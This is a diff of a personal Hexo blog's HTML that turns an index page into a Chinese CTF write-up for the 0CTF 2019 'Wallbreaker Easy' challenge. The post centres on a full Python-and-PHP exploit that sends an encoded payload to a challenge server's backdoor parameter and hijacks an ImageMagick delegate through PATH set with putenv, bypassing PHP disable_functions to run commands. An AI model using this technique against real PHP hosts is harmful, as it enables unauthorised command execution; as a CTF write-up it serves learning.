@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="CTF,">
 
 
 
@@ -79,16 +79,20 @@
 
 
 
-<meta name="description" content="hack for fun">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Moyu&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+<meta name="description" content="主要参考：https://paper.tuisec.win/detail/d4ba64dd4d1dc38http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easyhttps://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html以及学长的exp：http://mm">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0ctf wallbreaker easy writeup">
+<meta property="og:url" content="http://yoursite.com/2019/04/17/2019-0ctf/index.html">
 <meta property="og:site_name" content="Moyu&#39;s blog">
-<meta property="og:description" content="hack for fun">
+<meta property="og:description" content="主要参考：https://paper.tuisec.win/detail/d4ba64dd4d1dc38http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easyhttps://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html以及学长的exp：http://mm">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/04/17/2019-0ctf/flag-7.PNG">
+<meta property="og:updated_time" content="2019-07-07T04:40:10.161Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Moyu&#39;s blog">
-<meta name="twitter:description" content="hack for fun">
+<meta name="twitter:title" content="0ctf wallbreaker easy writeup">
+<meta name="twitter:description" content="主要参考：https://paper.tuisec.win/detail/d4ba64dd4d1dc38http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easyhttps://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html以及学长的exp：http://mm">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/17/2019-0ctf/flag-7.PNG">
 
 
 
@@ -118,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/page/2/">
+  <link rel="canonical" href="http://yoursite.com/2019/04/17/2019-0ctf/">
 
 
 
 
 
-  <title>Moyu's blog</title>
+  <title>0ctf wallbreaker easy writeup | Moyu's blog</title>
   
 
 
@@ -143,8 +147,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -237,9 +240,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -252,7 +255,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/07/wakanda/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/17/2019-0ctf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Moyu">
@@ -269,9 +272,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/02/07/wakanda/" itemprop="url">wakanda writeup</a></h1>
+          <h1 class="post-title" itemprop="name headline">0ctf wallbreaker easy writeup</h1>
         
 
         <div class="post-meta">
@@ -283,8 +284,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-07T10:48:46+08:00">
-                2019-02-07
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-17T00:00:00+08:00">
+                2019-04-17
               </time>
             
 
@@ -315,7 +316,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  772
+                  462
                 </span>
               
 
@@ -340,25 +341,11 @@
       
 
       
-        
-          
-          wakanda writeup靶机下载学到的姿势
+        <p><strong>主要参考：</strong><br><a href="https://paper.tuisec.win/detail/d4ba64dd4d1dc38" target="_blank" rel="noopener">https://paper.tuisec.win/detail/d4ba64dd4d1dc38</a><br><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy" target="_blank" rel="noopener">http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy</a><br><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a><br>以及学长的exp：<a href="http://mmmmmmlei.cn/" target="_blank" rel="noopener">http://mmmmmmlei.cn/</a><br>这里记录下自己对这道题的思考，非常感谢无私分享的各位大佬<br><strong>主要思路：</strong><br>ImageMagick有一个功能叫做delegate（委托），ImageMagick在解析其不可解析的文件类型时，会尝试调用第三方程序来加载，而调用外部lib的过程是使用系统的system命令来执行的，所以我们需要做的就是用ImageMagick去解析一个无法解析的文件，然后通过putenv去劫持函数<br>exp如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">sysimport base64dir=&quot;/tmp/73896d8f09a8ff21be5e9519fe2a6670&quot; #替换成自己的</span><br><span class="line"></span><br><span class="line">exploit_php = &apos;&apos;&apos;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">Open Basedir: &lt;br&gt;&lt;?php echo ini_get(&apos;open_basedir&apos;);?&gt;&lt;br&gt;</span><br><span class="line">Disable functions: &lt;br&gt;&lt;?php echo ini_get(&apos;disable_functions&apos;); ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$tmp = &quot;%s&quot;;</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;$tmp/1.bmp&quot;, file_get_contents(&quot;http://www.humanesociety.org/sites/default/files/2018/06/cat-217679.jpg&quot;)); #将正常的图片文件写到tmp目录下</span><br><span class="line">$exp = &lt;&lt;&lt;EOF</span><br><span class="line">#!/bin/bash</span><br><span class="line">export PATH=/usr/sbin:/usr/bin:/bin</span><br><span class="line">/readflag &gt; $tmp/data</span><br><span class="line">EOF;#修改路径到系统命令下</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;$tmp/JxrEncApp&quot;, $exp); #ImageMagick无法解析jxr文件，会委托JxrEncApp去帮助解析，我们劫持JxrEncApp就可以执行命令</span><br><span class="line">chmod(&quot;$tmp/JxrEncApp&quot;, 0777); putenv(&quot;PATH=$tmp:/usr/sbin:/usr/bin:/bin&quot;); #配置环境变量</span><br><span class="line">try &#123; </span><br><span class="line">	$a = new Imagick();</span><br><span class="line">    $a-&gt;readImage(&quot;$tmp/1.bmp&quot;); #Imagick可以正常读文件 </span><br><span class="line">    $a-&gt;writeImage(&quot;$tmp/1.jxr&quot;); #Imagick无法解析</span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">	var_dump($e);</span><br><span class="line">&#125;;?&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">Command output:</span><br><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;$tmp/data&quot;); #读flag</span><br><span class="line">?&gt;&lt;/pre&gt;</span><br><span class="line">&apos;&apos;&apos;% dir</span><br><span class="line"></span><br><span class="line">gadget_code = &apos;&apos;&apos;</span><br><span class="line">file_put_contents(&quot;%s/gml&quot;, base64_decode(&quot;%s&quot;));</span><br><span class="line">include &quot;%s/gml&quot;;</span><br><span class="line">unlink(&quot;%s/gml&quot;);&apos;&apos;&apos;% (dir,base64.b64encode(exploit_php),dir,dir)print(requests.post(&quot;http://111.186.63.208:31340&quot;, data=&#123;&apos;backdoor&apos;: gadget_code &#125;).content)</span><br></pre></td></tr></table></figure>
 
-从python命令提示符到交互式shell
-查找属于某用户的所有文件
-用python开启HTTP服务
-fakepip
+<p>将注释删掉，直接运行即可得到flag<br><img src="flag-7.PNG" alt="flag-7"></p>
 
-将靶机和攻击机设置为桥接，通过扫描即可发现靶机(vmware需要先设置桥接绑定的网卡，否则攻击机可能会无法联网)然后nmap开路
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/02/07/wakanda/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
       
     </div>
     
@@ -373,160 +360,40 @@ fakepip
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/02/计算机组成原理/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Moyu">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/wlp.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Moyu's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/02/计算机组成原理/" itemprop="url">计算机组成原理</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-02T11:04:43+08:00">
-                2018-11-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
           
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  6.8k
-                </span>
-              
-
-              
-
-              
-            </div>
-          
-
-          
-
         </div>
-      </header>
-    
+      
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+      
       
       
 
       
-        
-          
-          计算机系统概论翻译与解释翻译：先用转换程序将高一级机器级的程序整个地变换成低一级机器级上可运行的等效程序，然后再在低一级机器级上去实现的技术解释：在低一级机器级上用它的一串语句或指令来仿真高一级机器级上的一条语句或指令的功能，通过对高一级机器语言程序中的每条语句或指令逐条解释来实现的技术
-冯诺依曼机
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/11/02/计算机组成原理/#more" rel="contents">
-              Read more &raquo;
-            </a>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/01/pragyan/" rel="next" title="Pragyan CTF writeup">
+                <i class="fa fa-chevron-left"></i> Pragyan CTF writeup
+              </a>
+            
           </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
 
-    
+          <span class="post-nav-divider"></span>
 
-    
-
-    
-
-    <footer class="post-footer">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/17/teaser/" rel="prev" title="Teaser CONFidence CTF 2019 web writeup">
+                Teaser CONFidence CTF 2019 web writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
       
 
       
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -536,14 +403,11 @@ fakepip
   </article>
 
 
-    
-  </section>
 
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-  </nav>
-
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -551,6 +415,10 @@ fakepip
 
 
           
+
+  
+
+
 
         </div>
         
@@ -767,6 +635,10 @@ fakepip
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
